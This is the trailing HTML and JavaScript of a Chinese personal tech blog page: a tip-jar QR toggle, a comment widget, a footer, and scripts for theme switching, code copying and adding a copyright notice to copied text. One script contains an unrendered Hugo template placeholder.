            <div style="padding: 0 0 0 0; margin: 0 0 0 0; width: 100%; font-size:16px; text-align: center;">
                <div id="QR" style="opacity: 0;">
                    <div id="wechat" style="display: inline-block">
                        <a class="fancybox" rel="group">
                            <img id="wechat_qr" src="https://n3bu74.github.io/img/Bilibili.png" alt="wechat_pay"></a>
                        <p>微信</p>
                    </div>
                    <div id="alipay" style="display: inline-block">
                        <a class="fancybox" rel="group">
                            <img id="alipay_qr" src="https://n3bu74.github.io/img/Github.png" alt="alipay"></a>
                        <p>支付宝</p>
                    </div>
                </div>
                <button id="rewardButton"
                        onclick="
                    var qr = document.getElementById('QR');
                    if (qr.style.opacity === '0') {
                        qr.style.opacity='1';
                    } else {
                        qr.style.opacity='0'
                    }"
                >
                    <span>🧧 鼓励</span>
                </button>
            </div>
        </div>

        <footer class="post-footer">
            
<nav class="paginav">
  <a class="next" href="https://n3bu74.github.io/posts/sec/chinese-remainder-theorem/">
    <span class="title">下一页 »</span>
    <br>
    <span>中国剩余定理</span>
  </a>
</nav>

        </footer>
    </div>



<div>
    <div class="pagination__title">
        <span class="pagination__title-h" style="font-size: 20px;">💬评论</span>
        <hr />
    </div>

    <div id="tcomment"></div>

    <script src="https://cdn.staticfile.org/twikoo/1.5.8/twikoo.all.min.js">
    </script>
    

    

    <script>
        twikoo.init({
            envId:  null , 
            el: "#tcomment",
            lang: 'zh-CN',
            region:  null ,
            path: window.TWIKOO_MAGIC_PATH||window.location.pathname,
            
            
            
            
            
            
            
        });
    </script>

</div>
</article>
</main>


<script async src="https://unpkg.com/mermaid@8.8.1/dist/mermaid.min.js"></script>


<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


<footer class="footer">
    <span>
        Copyright
        &copy;
        2022-2023
        <a href="https://n3bu74.github.io" style="color:#939393;">N3bu74&#39;s Blog</a>
        All Rights Reserved
    </span>

    <a href="https://beian.miit.gov.cn/" target="_blank" style="color:#939393;"></a>&nbsp;

    <span>
        <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=null"
           style="display:inline-block;text-decoration:none;height:20px;color:#939393;">
            <img src="" style="float:left;margin: 0px 5px 0px 0px;"/>
            
        </a>
    </span>

    <span id="busuanzi_container">
        <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
        总访客数: <span id="busuanzi_value_site_uv"></span>
        总访问量: <span id="busuanzi_value_site_pv"></span>
    </span>

</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <span class="topInner">
        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z"/>
        </svg>
        <span id="read_progress"></span>
    </span>
</a>

<script>
    document.addEventListener('scroll', function (e) {
        const readProgress = document.getElementById("read_progress");
        const scrollHeight = document.documentElement.scrollHeight;
        const clientHeight = document.documentElement.clientHeight;
        const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
        
        readProgress.innerText = ((scrollTop / (scrollHeight - clientHeight)).toFixed(2) * 100).toFixed(0);
    })
</script>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    let mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 400 || document.documentElement.scrollTop > 400) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };
</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>

<script>
    document.body.addEventListener('copy', function (e) {
        if (window.getSelection().toString() && window.getSelection().toString().length > 50) {
            let clipboardData = e.clipboardData || window.clipboardData;
            if (clipboardData) {
                e.preventDefault();
                let htmlData = window.getSelection().toString() +
                    '\r\n\n————————————————\r\n' +
                    '版权声明：本文为「' + {
                { .
                    Site.Title
                }
            }
                +'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
                '\r\n原文链接：' + location.href;
                let textData = window.getSelection().toString() +
                    '\r\n\n————————————————\r\n' +
                    '版权声明：本文为「' + {
                { .
                    Site.Title
                }
            }
                +'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
                '\r\n原文链接：' + location.href;
                clipboardData.setData('text/html', htmlData);
                clipboardData.setData('text/plain', textData);
            }
        }
    });
</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = '📄复制';

        function copyingDone() {
            copybutton.innerText = '👌🏻已复制!';
            setTimeout(() => {
                copybutton.innerText = '📄复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                let text = codeblock.textContent +
                    '\r\n————————————————\r\n' +
                    '版权声明：本文为「' + "N3bu74's Blog"
                +'」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。' +
                '\r\n原文链接：' + location.href;
                navigator.clipboard.writeText(text);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) {
            }
            ;
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild === container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName === "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>

<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
<script>
    $("code[class^=language] ").on("mouseover", function () {
        if (this.clientWidth < this.scrollWidth) {
            $(this).css("width", "135%")
        }
    }).on("mouseout", function () {
        $(this).css("width", "100%")
    })
</script>
</body>

</html>
